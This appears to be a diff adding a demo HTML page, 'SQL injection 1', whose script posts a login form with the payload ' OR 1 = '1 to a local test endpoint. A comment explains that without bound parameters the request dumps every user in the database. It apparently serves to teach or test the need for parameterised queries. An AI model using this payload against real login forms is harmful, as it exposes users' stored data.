@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible"
+        content="IE=edge">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
+    <title>SQL injection 1</title>
+</head>
+
+<body>
+    <script>
+    /* If you don't use bindParam or bindValue in the select statement, 
+        this will get all users in the db, and display them in the console */
+    async function steal_data() {
+        let form = new FormData();
+        form.append("user_email", "h@a.com")
+        form.append("user_password", " ' OR  1 = '1");
+        const conn = await fetch("api-test.php", {
+            method: "POST",
+            body: form
+        });
+        const res = await conn.json();
+        console.log(res);
+    }
+
+    steal_data();
+    </script>
+</body>
+
+</html>
